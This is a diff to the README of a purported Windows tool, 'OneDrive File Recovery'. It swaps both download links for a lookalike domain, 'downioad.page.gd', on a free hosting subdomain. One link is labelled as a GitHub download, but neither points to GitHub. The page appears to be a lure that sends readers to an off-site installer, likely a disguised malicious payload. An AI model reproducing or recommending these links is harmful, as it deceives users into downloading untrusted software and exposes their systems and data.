@@ -2,7 +2,7 @@
 
 OneDrive File Recovery is a powerful and user-friendly tool designed specifically for Windows users to recover deleted files from their OneDrive accounts. Whether you've accidentally removed important documents or need to restore previous versions, this software provides a seamless solution to safeguard your data in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -54,7 +54,7 @@ A: OneDrive File Recovery offers a free version with core recovery features. Adv
 
 Get the latest version of OneDrive File Recovery from the official download page. Ensure you always use the most recent build for the best performance and security.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Additional Information
 
